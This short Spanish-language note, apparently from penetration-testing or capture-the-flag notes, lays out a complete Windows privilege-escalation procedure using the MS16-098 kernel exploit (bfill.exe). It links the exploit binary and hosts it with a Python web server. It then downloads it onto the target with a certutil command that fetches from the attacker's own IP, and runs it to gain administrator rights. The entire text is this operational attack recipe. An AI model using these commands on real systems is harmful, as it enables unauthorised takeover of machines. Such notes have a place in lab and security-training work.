** Descargar archivo ejecutable bfill.exe de SecWiki, vulnerabilidades para Windows **
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe

>Preparar servidor web en máquina local donde se encuentra el archivo bfill.exe
>`python -m SimpleHTTPServer 80`
>Transferir archivo desde máquina Windows objetivo
>`certutil.exe -f -urlcache -split http://<own_ip>:<puerto>/bfill.exe bfill.exe`
>Ejecutar bfill.exe en máquina Windows objetivo
>`bfill.exe`
>Escala privilegiso a usuario administrator